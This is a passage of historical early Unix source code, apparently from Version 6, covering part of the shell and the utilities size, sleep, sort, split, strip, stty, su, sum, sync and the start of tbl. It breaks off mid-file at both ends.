			execv(t[DSPR], t+DSPR);
			prs("glob: cannot execute\n");
			exit();
		}
		scan(t, &trim);
		*linep = 0;
		texec(t[DCOM], t);
		cp1 = linep;
		cp2 = "/usr/bin/";
		while(*cp1 = *cp2++)
			cp1++;
		cp2 = t[DCOM];
		while(*cp1++ = *cp2++);
		texec(linep+4, t);
		texec(linep, t);
		prs(t[DCOM]);
		err(": not found");
		exit();

	case TFIL:
		f = t[DFLG];
		pipe(pv);
		t1 = t[DLEF];
		t1[DFLG] =| FPOU | (f&(FPIN|FINT|FPRS));
		execute(t1, pf1, pv);
		t1 = t[DRIT];
		t1[DFLG] =| FPIN | (f&(FPOU|FINT|FAND|FPRS));
		execute(t1, pv, pf2);
		return;

	case TLST:
		f = t[DFLG]&FINT;
		if(t1 = t[DLEF])
			t1[DFLG] =| f;
		execute(t1);
		if(t1 = t[DRIT])
			t1[DFLG] =| f;
		execute(t1);
		return;

	}
}

texec(f, at)
int *at;
{
	extern errno;
	register int *t;

	t = at;
	execv(f, t+DCOM);
	if (errno==ENOEXEC) {
		if (*linep)
			t[DCOM] = linep;
		t[DSPR] = "/bin/sh";
		execv(t[DSPR], t+DSPR);
		prs("No shell!\n");
		exit();
	}
	if (errno==ENOMEM) {
		prs(t[DCOM]);
		err(": too large");
		exit();
	}
}

err(s)
char *s;
{

	prs(s);
	prs("\n");
	if(promp == 0) {
		seek(0, 0, 2);
		exit();
	}
}

prs(as)
char *as;
{
	register char *s;

	s = as;
	while(*s)
		putc(*s++);
}

putc(c)
{

	write(2, &c, 1);
}

prn(n)
int n;
{
	register a;

	if(a=ldiv(0,n,10))
		prn(a);
	putc(lrem(0,n,10)+'0');
}

any(c, as)
int c;
char *as;
{
	register char *s;

	s = as;
	while(*s)
		if(*s++ == c)
			return(1);
	return(0);
}

equal(as1, as2)
char *as1, *as2;
{
	register char *s1, *s2;

	s1 = as1;
	s2 = as2;
	while(*s1++ == *s2)
		if(*s2++ == '\0')
			return(1);
	return(0);
}

pwait(i, t)
int i, *t;
{
	register p, e;
	int s;

	if(i != 0)
	for(;;) {
		times(&timeb);
		time(timeb.proct);
		p = wait(&s);
		if(p == -1)
			break;
		e = s&0177;
		if(mesg[e] != 0) {
			if(p != i) {
				prn(p);
				prs(": ");
			}
			prs(mesg[e]);
			if(s&0200)
				prs(" -- Core dumped");
		}
		if(e != 0)
			err("");
		if(i == p) {
			acct(t);
			break;
		} else
			acct(0);
	}
}

acct(t)
int *t;
{
	if(t == 0)
		enacct("**gok"); else
	if(*t == TPAR)
		enacct("()"); else
	enacct(t[DCOM]);
}

enacct(as)
char *as;
{
	struct stime timbuf;
	struct {
		char cname[14];
		char shf;
		char uid;
		int datet[2];
		int realt[2];
		int bcput[2];
		int bsyst[2];
	} tbuf;
	register i;
	register char *np, *s;

	s = as;
	times(&timbuf);
	time(timbuf.proct);
	lsub(tbuf.realt, timbuf.proct, timeb.proct);
	lsub(tbuf.bcput, timbuf.cputim, timeb.cputim);
	lsub(tbuf.bsyst, timbuf.systim, timeb.systim);
	do {
		np = s;
		while (*s != '\0' && *s != '/')
			s++;
	} while (*s++ != '\0');
	for (i=0; i<14; i++) {
		tbuf.cname[i] = *np;
		if (*np)
			np++;
	}
	tbuf.datet[0] = timbuf.proct[0];
	tbuf.datet[1] = timbuf.proct[1];
	tbuf.uid = uid;
	tbuf.shf = 0;
	if (promp==0)
		tbuf.shf = 1;
	seek(acctf, 0, 2);
	write(acctf, &tbuf, sizeof(tbuf));
}
-- /usr/source/s2/size.c mode=0100664 uid=3 gid=3 atime=174923638 mtime=169260600 --
/*
	size -- determine object size

*/

main(argc, argv)
char **argv;
{
	int buf[010], f, ac, sum;

	ac = argc;
	if (ac==1) {
		*argv = "a.out";
		ac++;
		--argv;
	}
	while(--ac) {
		++argv;
		if((f=open(*argv, 0))<0) {
			printf("%s not found\n", *argv);
			continue;
		}
		read(f, buf, 0020);
		if(buf[0]!=0411 && buf[0]!=0410 && buf[0]!=0407) {
			printf("Bad format: %s\n", *argv);
			close(f);
			continue;
		}
		if (argc>2)
			printf("%s: ", *argv);
		printf("%l+%l+%l=", buf[1],buf[2],buf[3]);
		sum = buf[1]+buf[2]+buf[3];
		printf("%l (%o)\n", sum, sum);
		close(f);
	}
}
-- /usr/source/s2/sleep.c mode=0100664 uid=3 gid=3 atime=174923648 mtime=169260600 --
main(argc, argv)
char **argv;
{
	int c, n;
	char *s;

	n = 0;
	if(argc < 2) {
		printf("arg count\n");
		exit();
	}
	s = argv[1];
	while(c = *s++) {
		if(c<'0' || c>'9') {
			printf("bad character\n");
			exit();
		}
		n = n*10 + c - '0';
	}
	sleep(n);
}
-- /usr/source/s2/sort.c mode=0110664 uid=3 gid=3 atime=174923658 mtime=169260600 --
#define	L	512
#define	N	7
#define	C	20
#define	MEM	(16*2048)
#define NF	10

int	ibuf[259];
int	obuf[259];
char	*file;
char	*filep;
int	nfiles;
int	nlines;
int	ntext;
int	*lspace;
char	*tspace;
int	cmp();
int	term();
int 	mflg;
char	*outfil;
char	tabchar;
int 	eargc;
char	**eargv;

char	fold[128] {
	0000,0001,0002,0003,0004,0005,0006,0007,
	0010,0011,0012,0013,0014,0015,0016,0017,
	0020,0021,0022,0023,0024,0025,0026,0027,
	0030,0031,0032,0033,0034,0035,0036,0037,
	0040,0041,0042,0043,0044,0045,0046,0047,
	0050,0051,0052,0053,0054,0055,0056,0057,
	0060,0061,0062,0063,0064,0065,0066,0067,
	0070,0071,0072,0073,0074,0075,0076,0077,
	0100,0101,0102,0103,0104,0105,0106,0107,
	0110,0111,0112,0113,0114,0115,0116,0117,
	0120,0121,0122,0123,0124,0125,0126,0127,
	0130,0131,0132,0133,0134,0134,0136,0137,
	0140,0101,0102,0103,0104,0105,0106,0107,
	0110,0111,0112,0113,0114,0115,0116,0117,
	0120,0121,0122,0123,0124,0125,0126,0127,
	0130,0131,0132,0173,0174,0175,0176,0177
};
char	nofold[128];
char	dict[128] {
	1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,1,
	1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
	0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
	0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,
	1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,
	1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1
};
char	nodict[128] { 1 };

struct	field {
	char *code;
	char *ignore;
	int nflg;
	int rflg;
	int bflg;
	char *m[2];
	char *n[2];
}	fields[NF];
int proto[9] {
	&fold,
	&nodict,
	0,
	1,
	0,
	0,-1,
	0,0
};
int	nfields;
int 	error 1;

main(argc, argv)
char **argv;
{
	register a, i;
	char *arg;
	register int *p;
	int *q;

	for(a=0; a<128; a++)
		nofold[a] = a;
	nodict[127] = 1;
	copyproto();
	eargv = argv;
	while (--argc > 0) {
		if(**++argv == '-') for(arg = *argv;;) {
			switch(*++arg) {
			case '\0':
				if(arg[-1] == '-')
					eargv[eargc++] = "-";
				break;

			case 'm':
				mflg++;
				continue;

			case 'o':
				if(--argc > 0)
					outfil = *++argv;
				continue;

			default:
				field(++*argv,1);
				break;
			}
			break;
		} else if (**argv == '+') {
			if(++nfields>=NF) {
				mess("Too many keys\n");
				exit(1);
			}
			copyproto();
			field(++*argv,0);
		} else
			eargv[eargc++] = *argv;
	}
	q = &fields[0];
	for(a=1; a<=nfields; a++) {
		p = &fields[a];
		for(i=0; i<5; i++)	/*sensitive to sizeof(proto)*/
			if(p[i] != proto[i])
				goto next;
		for(i=0; i<5; i++)
			p[i] = q[i];
next:	;
	}
	if(eargc == 0)
		eargv[eargc++] = "-";

	a = MEM;
	i = lspace = sbrk(0);
	while(brk(a) == -1)
		a =- 512;
	brk(a =- 512);	/* for recursion */
	a =- i;
	nlines = ((a-L)>>1) & 077777;
	nlines =/ 5;
	ntext = nlines*8;
	tspace = lspace+nlines;
	file = "/usr/tmp/stmXaa";
loop:
	filep = file;
	while(*filep != 'X')
		filep++;
	for(*filep = 'a';;(*filep)++) {
		if(stat(file, lspace) < 0) {
			a = creat(file, 0600);
			if(a >= 0)
				break;
		}
		if(*filep == 'z') {
			if(file[1] != 't') {
				file = "/tmp/stmXaa";
				goto loop;
			}
			mess("Cannot locate temp\n");
			exit(1);
		}
	}
	close(a);
	filep++;
	if ((signal(2, 1) & 01) == 0)
		signal(2, term);
	nfiles = eargc;
	if(!mflg) {
		ibuf[0] = -1;
		sort();
		close(0);
	}
	for(a = mflg?0:eargc; a+N < nfiles; a=+N) {
		newfile();
		merge(a, a+N);
	}
	if(a != nfiles) {
		oldfile();
		merge(a, nfiles);
	}
	error = 0;
	term();
}

sort()
{
	register char *cp;
	register *lp, c;
	int done;
	int i;
	int f;

	done = 0;
	i = 0;
	do {
		cp = tspace;
		lp = lspace;
		while(lp < lspace+nlines && cp < tspace+ntext) {
			*lp++ = cp;
			while((*cp++ = c = getc(ibuf)) != '\n') {
				if(c >= 0) continue;
				cp--;
				close(ibuf[0]);
				if(i < eargc) {
					if((f = setfil(i++)) == 0)
						ibuf[0] = 0;
					else if(fopen(f, ibuf) < 0)
						cant(f);
				} else
					break;
			}
			if(c < 0) {
				done++;
				lp--;
				break;
			}
		}
		qsort(lspace, lp-lspace, 2, cmp);
		if(done == 0 || nfiles != eargc)
			newfile(); else
			oldfile();
		while(lp > lspace) {
			cp = *--lp;
			do
				putc(*cp, obuf);
			while(*cp++ != '\n');
		}
		fflush(obuf);
		close(obuf[0]);
	} while(done == 0);
}

struct merg
{
	char	l[L];
	int	b[259];
};

merge(a, b)
{
	register struct merg *p;
	register char *cp;
	register i;
	struct { int *ip;};
	int f;
	int j;

	p = lspace;
	j = 0;
	for(i=a; i<b; i++) {
		f = setfil(i);
		if(f == 0)
			p->b[0] = dup(0);
		else if(fopen(f, p->b) < 0)
			cant(f);
		ibuf[j] = p;
		if(!rline(p)) j++;
		p++;
	}
	i = j;
	qsort(ibuf, i, 2, cmp);
	if(i > 0) for(;;) {
		cp = ibuf[i-1];
		do
			putc(*cp, obuf);
		while(*cp++ != '\n');
		if(rline(ibuf[i-1])) {
			i--;
			if(i == 0)
				break;
		}
		cp = &ibuf[i];
		while (--cp.ip > ibuf && cmp(cp.ip, cp.ip-1) < 0) {
			p = *cp.ip;
			*cp.ip = *(cp.ip-1);
			*(cp.ip-1) = p;
		}
	}
	p = lspace;
	for(i=a; i<b; i++) {
		close(p->b[0]);
		p++;
		if(i >= eargc)
			close(creat(setfil(i)));
	}
	fflush(obuf);
	close(obuf[0]);
}

rline(mp)
struct merg *mp;
{
	register char *cp;
	register *bp, c;

	bp = mp->b;
	cp = mp->l;
	do {
		c = getc(bp);
		if(c < 0)
			return(1);
		*cp++ = c;
	} while(c != '\n');
	return(0);
}

newfile()
{

	if(fcreat(setfil(nfiles), obuf) < 0) {
		mess("Can't create temp\n");
		term();
	}
	nfiles++;
}

char *
setfil(i)
{

	if(i < eargc)
		if(eargv[i][0] == '-' && eargv[i][1] == '\0')
			return(0);
		else
			return(eargv[i]);
	i =- eargc;
	filep[0] = i/26 + 'a';
	filep[1] = i%26 + 'a';
	return(file);
}

oldfile()
{

	if(outfil) {
		if(fcreat(outfil, obuf) < 0) {
			mess("Can't create output\n");
			term();
		}
	} else
		obuf[0] = 1;
}

cant(f)
{
	mess("Can't open ");
	mess(f);
	mess("\n");
	term();
}

term()
{
	register i;

	if(nfiles == eargc)
		nfiles++;
	for(i=eargc; i<nfiles; i++)
		unlink(setfil(i));
	exit(error);
}

cmp(i, j)
int *i, *j;
{
	register char *pa, *pb;
	char *code, *ignore;
	int a, b;
	int k;
	char *la, *lb;
	register int sa;
	int sb;
	char *ipa, *ipb, *jpa, *jpb;
	struct field *fp;

	for(k = nfields>0; k<=nfields; k++) {
		fp = &fields[k];
		pa = *i;
		pb = *j;
		if(k) {
			la = skip(pa, fp, 1);
			pa = skip(pa, fp, 0);
			lb = skip(pb, fp, 1);
			pb = skip(pb, fp, 0);
		} else {
			la = -1;
			lb = -1;
		}
		if(fp->nflg) {
			while(blank(*pa))
				pa++;
			while(blank(*pb))
				pb++;
			sa = sb = fp->rflg;
			if(*pa == '-') {
				pa++;
				sa = -sa;
			}
			if(*pb == '-') {
				pb++;
				sb = -sb;
			}
			if(sa != sb)
				sa = 0;
			for(ipa = pa; ipa<la&&digit(*ipa); ipa++);
			for(ipb = pb; ipb<lb&&digit(*ipb); ipb++);
			jpa = ipa;
			jpb = ipb;
			a = 0;
			if(sa) while(ipa > pa && ipb > pb)
				if(b = *--ipb - *--ipa)
					a = b;
			while(ipa > pa)
				if(*--ipa != '0')
					return(sa ? -sa : sb);
			while(ipb > pb)
				if(*--ipb != '0')
					return(sa ? sa : sb);
			if(a) return(a*sa);
			if(*(pa=jpa) == '.')
				pa++;
			if(*(pb=jpb) == '.')
				pb++;
			while(pa<la && digit(*pa))
				if(pb<lb &&digit(*pb)) {
					if(a = *pb++ - *pa++)
						return(sa ? a*sa : sb);
				} else if(*pa++ != '0')
					return(sa ? -sa : sb);
			while(pb<lb && digit(*pb))
				if(*pb++ != '0')
					return(sa ? sa : sb);
			continue;
		}
		code = fp->code;
		ignore = fp->ignore;
loop: 
		while(*pa<0 || ignore[*pa])
			pa++;
		while(*pb<0 || ignore[*pb])
			pb++;
		if(pa>=la || *pa=='\n')
			if(pb<lb && *pb!='\n')
				return(fp->rflg);
			else continue;
		if(pb>=lb || *pb=='\n')
			return(-fp->rflg);
		if((sa = code[*pb++]-code[*pa++]) == 0)
			goto loop;
		return(sa*fp->rflg);
	}
	pa = *i;
	pb = *j;
	while(*pa != '\n') {
		if(*pa == *pb) {
			pa++;
			pb++;
			continue;
		}
		if(*pb == '\n')
			return(-1);
		return(*pb - *pa);
	}
	return(*pb != '\n');
}

skip(pp, fp, j)
struct field *fp;
char *pp;
{
	register i;
	register char *p;

	p = pp;
	if( (i=fp->m[j]) < 0)
		return(-1);
	while(i-- > 0) {
		if(tabchar != 0) {
			while(*p != tabchar)
				if(*p != '\n')
					p++;
				else goto ret;
			p++;
		} else {
			while(blank(*p))
				p++;
			while(!blank(*p))
				if(*p != '\n')
					p++;
				else goto ret;
		}
	}
	if(fp->bflg)
		while(blank(*p))
			p++;
	i = fp->n[j];
	while(i-- > 0) {
		if(*p != '\n')
			p++;
		else goto ret;
	} 
ret:
	return(p);
}

digit(c)
{

	return(c <= '9' && c >= '0');
}

mess(s)
char *s;
{
	while(*s)
		write(2, s++, 1);
}

copyproto()
{
	register int i, *p, *q;

	p = proto;
	q = &fields[nfields];
	for(i=0; i<sizeof(proto)/2; i++)
		*q++ = *p++;
}

field(s,k)
char *s;
{
	register struct field *p;
	p = &fields[nfields];
	for(; *s!=0; s++) {
		switch(*s) {
		case '\0':
			return;

		case 'a':
			p->code = nofold;
			break;

		case 'b':
			p->bflg++;
			break;

		case 'd':
			p->ignore = dict;
			break;

		case 'n':
			p->nflg++;
			break;
		case 't':
			tabchar = *++s;
			if(tabchar == 0) s--;
			break;

		case 'r':
			p->rflg = -1;
			break;

		default:
			p->m[k] = number(&s);
			if(*s == '.')
				s++;
			p->n[k] = number(&s);
			s--;
		}
	}
}

number(ppa)
char **ppa;
{
	int n;
	register char *pa;
	pa = *ppa;
	n = 0;
	while(digit(*pa))
		n = n*10 + *pa++ - '0';
	*ppa = pa;
	return(n);
}

blank(c)
{
	if(c==' ' || c=='\t')
		return(1);
	return(0);
}
-- /usr/source/s2/split.c mode=0100664 uid=3 gid=3 atime=174923685 mtime=169260600 --
int	count	1000;
int	fnumber;
int	ibuf[259];
int	obuf[259];
char	fname[100];
char	*ifil;
char	*ofil;

main(argc, argv)
char *argv[];
{
	register i, c, f;

	for(i=1; i<argc; i++)
	if(argv[i][0] == '-')
	switch(argv[i][1]) {

	case '\0':
		ifil = 1;
		continue;

	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
		count = number(argv[i]+1);
		continue;

	} else
	if(ifil)
		ofil = argv[i]; else
		ifil = argv[i];
	if(ifil != 0 && ifil != 1)
		if(fopen(ifil, ibuf) < 0) {
			write(2, "cannot open input\n", 18);
			exit();
		}
	if(ofil == 0)
		ofil = "x";

loop:
	f = 1;
	for(i=0; i<count; i++)
	do {
		c = getc(ibuf);
		if(c < 0) {
			if(f == 0)
				fflush(obuf);
			exit();
		}
		if(f) {
			for(f=0; ofil[f]; f++)
				fname[f] = ofil[f];
			fname[f++] = fnumber/26 + 'a';
			fname[f++] = fnumber%26 + 'a';
			fname[f] = '\0';
			fnumber++;
			if(fcreat(fname, obuf) < 0) {
				write(2, "Cannot create output\n", 20);
				exit();
			}
			f = 0;
		}
		putc(c, obuf);
	} while(c != '\n');
	fflush(obuf);
	close(obuf[0]);
	goto loop;
}

number(str)
char *str;
{
	register n;
	register char *s;

	n = 0;
	for(s = str; *s; s++)
		if(*s>='0' && *s<='9')
			n = n*10 + *s-'0';
	return(n);
}
-- /usr/source/s2/strip.s mode=0100664 uid=3 gid=3 atime=174923695 mtime=169260600 --
/ strip -- strip relocation and symbols

	mov	(sp)+,argc
	tst	(sp)+
	br	loop
unloop:
	sys	unlink; s.tmp
loop:
	dec	argc
	bgt	1f
	sys	exit
1:
	mov	(sp)+,r4
	mov	r4,0f
	sys	open; 0:..; 0
	bec	1f
	jsr	r5,mesg; <open error: \0>; .even
	br	loop
1:
	mov	r0,fi
	mov	$'a,r1
1:
	movb	r1,s.tmp+8
	sys	stat; s.tmp; buf
	bec	2f
	sys	creat; s.tmp; 400
	bec	1f
2:
	inc	r1
	cmp	r1,$'z
	blos	1b
	jsr	r5,mesg; <can't create temp file for \0>; .even
	sys	exit
1:
	mov	r0,fo
	clr	buf
	mov	fi,r0
	sys	read; buf; 512.
	mov	r0,r3
	cmp	buf,magic
	beq	1f
	cmp	buf,magic1
	beq	1f
	cmp	buf,magic2
	beq	1f
	jsr	r5,mesg; <improper format: \0>; .even
	br	unloop
1:
	mov	buf+2,r2
	add	buf+4,r2
	add	$20,r2
	clr	r1
	clr	buf+10
	mov	$1,buf+16		/ no reloc bits flag
1:
	mov	r2,0f
	sub	r1,0f
	cmp	0f,r3
	blos	2f
	mov	r3,0f
2:
	mov	fo,r0
	sys	write; buf; 0:..
	add	0b,r1
	cmp	r1,r2
	bhis	1f
	mov	fi,r0
	sys	read; buf; 512.
	mov	r0,r3
	bne	1b
	jsr	r5,mesg; <unexpected EOF: \0>; .even
1:
	mov	fo,r0
	sys	close
	mov	fi,r0
	sys	close
	mov	r4,0f
	sys	creat; 0:..; 0		/ same mode as before
	bec	1f
	jsr	r5,mesg; <can't rewrite: \0>; .even
	jmp	unloop
1:
	mov	r0,fo
	sys	open; s.tmp; 0
	bec	1f
	jsr	r5,mesg; <can't read temp file for: \0>; .even
	sys	exit
1:
	mov	r0,fi
1:
	mov	fi,r0
	sys	read; buf; 512.
	mov	r0,0f
	beq	1f
	mov	fo,r0
	sys	write; buf; 0:..
	br	1b
1:
	mov	fi,r0
	sys	close
	mov	fo,r0
	sys	close
	jmp	unloop

mesg:
	movb	(r5)+,ch
	beq	1f
	mov	$1,r0
	sys	write; ch; 1
	br	mesg
1:
	inc	r5
	bic	$1,r5
	mov	r4,r1
1:
	movb	(r1)+,ch
	beq	1f
	mov	$1,r0
	sys	write; ch; 1
	br	1b
1:
	mov	$1,r0
	sys	write; qnl; 1
	rts	r5

s.tmp:
	</tmp/stma\0>
qnl:
	<\n>
	.even
magic:	407
magic1:	410
magic2:	411

.bss
fi:	.=.+2
fo:	.=.+2
argc:	.=.+2
buf:	.=.+512.
ch:	.=.+2

-- /usr/source/s2/stty.c mode=0100664 uid=3 gid=3 atime=174923699 mtime=169260600 --
#
/*
 * set teletype modes
 */

/*
 * tty flags
 */
#define	HUPCL	01
#define	XTABS	02
#define	LCASE	04
#define	ECHO	010
#define	CRMOD	020
#define	RAW	040
#define	ODDP	0100
#define	EVENP	0200
#define	ANYP	0300

/*
 * Delay algorithms
 */
#define	CR0	0
#define	CR1	010000
#define	CR2	020000
#define	CR3	030000
#define	NL0	0
#define	NL1	000400
#define	NL2	001000
#define	NL3	001400
#define	TAB0	0
#define	TAB1	002000
#define	TAB2	004000
#define	TAB3	006000
#define	FF0	0
#define	FF1	040000
#define	BS0	0
#define	BS1	0100000
#define	ALL	0177400

struct
{
	char	*string;
	int	speed;
} speeds[]
{
	"0",	(0<<8)|0,
	"50",	(1<<8)|1,
	"75",	(2<<8)|2,
	"110",	(3<<8)|3,
	"134",	(4<<8)|4,
	"134.5",(4<<8)|4,
	"150",	(5<<8)|5,
	"200",	(6<<8)|6,
	"300",	(7<<8)|7,
	"600",	(8<<8)|8,
	"1200",	(9<<8)|9,
	"1800",	(10<<8)|10,
	"2400",	(11<<8)|11,
	"4800",	(12<<8)|12,
	"9600",	(13<<8)|13,
	"exta",	(14<<8)|14,
	"extb",	(15<<8)|15,
	0,
};
struct
{
	char	*string;
	int	set;
	int	reset;
} modes[]
{
	"even",
	EVENP, 0,

	"-even",
	0, EVENP,

	"odd",
	ODDP, 0,

	"-odd",
	0, ODDP,

	"raw",
	RAW, 0,

	"-raw",
	0, RAW,

	"cooked",
	0, RAW,

	"-nl",
	CRMOD, 0,

	"nl",
	0, CRMOD,

	"echo",
	ECHO, 0,

	"-echo",
	0, ECHO,

	"LCASE",
	LCASE, 0,

	"lcase",
	LCASE, 0,

	"-LCASE",
	0, LCASE,

	"-lcase",
	0, LCASE,

	"-tabs",
	XTABS, 0,

	"tabs",
	0, XTABS,

	"hup",
	HUPCL, 0,

	"-hup",
	0, HUPCL,

	"cr0",
	CR0, CR3,

	"cr1",
	CR1, CR3,

	"cr2",
	CR2, CR3,

	"cr3",
	CR3, CR3,

	"tab0",
	TAB0, TAB3,

	"tab1",
	TAB1, TAB3,

	"tab2",
	TAB2, TAB3,

	"tab3",
	TAB3, TAB3,

	"nl0",
	NL0, NL3,

	"nl1",
	NL1, NL3,

	"nl2",
	NL2, NL3,

	"nl3",
	NL3, NL3,

	"ff0",
	FF0, FF1,

	"ff1",
	FF1, FF1,

	"bs0",
	BS0, BS1,

	"bs1",
	BS1, BS1,

	"33",
	CR1, ALL,

	"tty33",
	CR1, ALL,

	"37",
	FF1+CR2+TAB1+NL1, ALL,

	"tty37",
	FF1+CR2+TAB1+NL1, ALL,

	"05",
	NL2, ALL,

	"vt05",
	NL2, ALL,

	"tn",
	CR1, ALL,

	"tn300",
	CR1, ALL,

	"ti",
	CR2, ALL,

	"ti700",
	CR2, ALL,

	"tek",
	FF1, ALL,

	0,
	};

char	*arg;
int	mode[3];

struct { char lobyte, hibyte; };

main(argc, argv)
char	*argv[];
{
	int i;

	gtty(1, mode);
	if(argc == 1) {
		prmodes();
		exit(0);
	}
	while(--argc > 0) {

		arg = *++argv;
		if (eq("ek"))
			mode[1] = '#@';
		if (eq("erase")) {
			mode[1].lobyte = **++argv;
			argc--;
		}
		if (eq("kill")) {
			mode[1].hibyte = **++argv;
			argc--;
		}
		for(i=0; speeds[i].string; i++)
			if(eq(speeds[i].string))
				mode[0] = speeds[i].speed;
		for(i=0; modes[i].string; i++)
			if(eq(modes[i].string)) {
				mode[2] =& ~modes[i].reset;
				mode[2] =| modes[i].set;
			}
		if(arg)
			printf("unknown mode: %s\n", arg);
	}
	stty(1,mode);
}

eq(string)
char *string;
{
	int i;

	if(!arg)
		return(0);
	i = 0;
loop:
	if(arg[i] != string[i])
		return(0);
	if(arg[i++] != '\0')
		goto loop;
	arg = 0;
	return(1);
}

prmodes()
{
	register m;

	if(mode[0].lobyte != mode[0].hibyte) {
		prspeed("input speed  ", mode[0].lobyte);
		prspeed("output speed ", mode[0].hibyte);
	} else
		prspeed("speed ", mode[0].lobyte);
	printf("erase = '%c'; kill = '%c'\n", mode[1].lobyte, mode[1].hibyte);
	m = mode[2];
	if(m & 0200) printf("even ");
	if(m & 0100) printf("odd ");
	if(m & 040) printf("raw ");
	if(m & 020) printf("-nl ");
	if(m & 010) printf("echo ");
	if(m & 04) printf("lcase ");
	if(m & 02) printf("-tabs ");
	if(m & 01) printf("hup ");
	delay(m>>8, "nl");
	delay(m>>10, "tab");
	delay(m>>12, "cr");
	delay((m>>14)&1, "ff");
	delay((m>>15)&1, "bs");
	printf("\n");
}

delay(m, s)
char *s;
{

	if(m =& 3)
		printf("%s%d ", s, m);
}

int	speed[]
{
	0,50,75,110,134,150,200,300,600,1200,1800,2400,4800,9600,0,0
};

prspeed(c, s)
{

	printf("%s%d baud\n", c, speed[s]);
}

putchar(c)
{

	write(2, &c, 1);
}
-- /usr/source/s2/su.c mode=0100664 uid=3 gid=3 atime=174923716 mtime=169260600 --
/* su -- become super-user */

char	password[100];
char	pwbuf[100];
int	ttybuf[3];
main()
{
	register char *p, *q;
	extern fin;

	if(getpw(0, pwbuf))
		goto badpw;
	(&fin)[1] = 0;
	p = pwbuf;
	while(*p != ':')
		if(*p++ == '\0')
			goto badpw;
	if(*++p == ':')
		goto ok;
	gtty(0, ttybuf);
	ttybuf[2] =& ~010;
	stty(0, ttybuf);
	printf("password: ");
	q = password;
	while((*q = getchar()) != '\n')
		if(*q++ == '\0')
			return;
	*q = '\0';
	ttybuf[2] =| 010;
	stty(0, ttybuf);
	printf("\n");
	q = crypt(password);
	while(*q++ == *p++);
	if(*--q == '\0' && *--p == ':')
		goto ok;
	goto error;

badpw:
	printf("bad password file\n");
ok:
	setuid(0);
	execl("/bin/sh", "-", 0);
	printf("cannot execute shell\n");
error:
	printf("sorry\n");
}
-- /usr/source/s2/sum.s mode=0100664 uid=3 gid=3 atime=174923725 mtime=169260600 --
/ sum -- check sum file

	mov	(sp)+,r3
	tst	(sp)+
loop:	dec	r3
	bgt	1f
	sys	exit
1:
	clr	bcnt
	mov	(sp)+,0f
	sys	open; 0:..; 0
	bec	3f
	mov	$1,r0
	sys	write; 1f; 2f-1f
	br	loop
1:	<oprd\n>
2:	.even
3:	mov	r0,r1
	clr	r5
1:
	mov	r1,r0
	sys	read; buf; 512.
	bes	err
	tst	r0
	beq	print
	inc	bcnt
	mov	$buf,r2
2:
	movb	(r2)+,r4
	add	r4,r5
	adc	r5
	sob	r0,2b
	br	1b

err:
	mov	$1,r0
	sys	write; 1f; 2

print:
	jsr	pc,decml
	mov	$1,r0
	sys	write; bl; 1
	mov	bcnt,r5
	jsr	pc,decml
	mov	$1,r0
	sys	write; nl; 1
	mov	r1,r0
	sys	close
	br	loop
1:	<? >
nl:	<\n>
bl:	< >
	.even

decml:
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	r5,r1
	jsr	pc,1f
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	pc

1:
	clr	r0
	dvd	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,ch
	add	$'0,ch
	mov	$1,r0
	sys	write; ch; 1
	rts	pc

.bss
ch:	.=.+2
bcnt:	.=.+2
buf: .=.+512.
-- /usr/source/s2/sync.c mode=0100664 uid=3 gid=3 atime=174923729 mtime=169260600 --
main()
{

	sync();
}
-- /usr/source/s2/tbl.c mode=0110664 uid=3 gid=3 atime=174923738 mtime=169260600 --
#
# define ever (;;)
# define MAXCHS 2000
main(argc,argv)
	char *argv[];
{
char line[200];
extern int cin;
extern char *cspace;
	cspace = getvec(MAXCHS + 100);
for ever
{
	if (argc>1)
	{
	argc--;
	argv++;
	if (match(*argv, "-ms"))
		*argv = "/usr/lib/tmac.s";
	cin = copen(*argv, 'r');
	if (cin < 0)
		{
		printf(2,"where is input file %s\n",*argv);
		cexit();
		}
	}
while (gets(line))
	if (match(line, ".TS"))
		tableput();
	else
		puts(line);
if (argc <= 1) break;
}
cexit();
}
# define MAXCOL 35
# define MAXLIN 220
# define ONELINE 250
char *tabentry[MAXLIN][MAXCOL];
char extra[MAXCHS];
char *cspace, *cstore;
char *exstore extra;
int sep[MAXCOL], dwide[MAXCOL];
char *instead[MAXLIN];
int newtab[MAXLIN];
char *style[MAXCOL];
tableput()
{
/* read input, write output, make tables on the way */
char st[ONELINE], *format;
int ilin, nlin, icol, ncol, k, ch, ws, cs, ns;
int maxchnge, ct;
printf(".TS\n");
/* get command line */
cstore = cspace;
exstore = extra;
ncol = 0;
for (ilin=0; ilin<MAXLIN; ilin++)
	newtab[ilin]=0;
gets (st);
for (k=0; k<ONELINE && st[k] != '\0'; k++)
	if (!space(st[k]))
		{
		style[ncol] = st+k;
		dwide[ncol] =0;
		for(; letter(st[k]); k++)
			{
			if ((st[k]=='n' || st[k] == 'N') &&
				!dwide[ncol])
				{
				dwide[ncol]=1;
				sep[ncol++] = 0;
				style[ncol] = style[ncol-1];
				dwide [ncol] = 0;
				}
			}
		if (digit(st[k]))
			sep[ncol] = numb(st+k);
		else
			sep[ncol] = 3;
		ncol++;
		while (digit(st[k]))
			st[k++] = '\0';
		if (st[k] == '\0')
			break;
		st[k] = '\0';
		}
/* now get input lines */
for (nlin=0; gets(cstore) && !match(cstore, ".TE"); nlin++)
	{
	if (cstore[0] == '.' && letter(cstore[1]))
		{
		instead[nlin] = cstore;
		while (*cstore) cstore++;
		}
	else instead[nlin] = 0;
	for (icol = 0; icol <ncol; icol++)
		{
		tabentry[nlin][icol] = cstore;
		for(; (ch= *cstore) != '\0' && ch != '\t'; cstore++)
				;
		*cstore++ = '\0';
		if (dwide[icol] )
			if (broken(style[icol],nlin))
				{
				tabentry[nlin][icol+1]=maknew(tabentry[nlin][icol]);
				icol++;
				if (tabentry[nlin][icol] ==0)
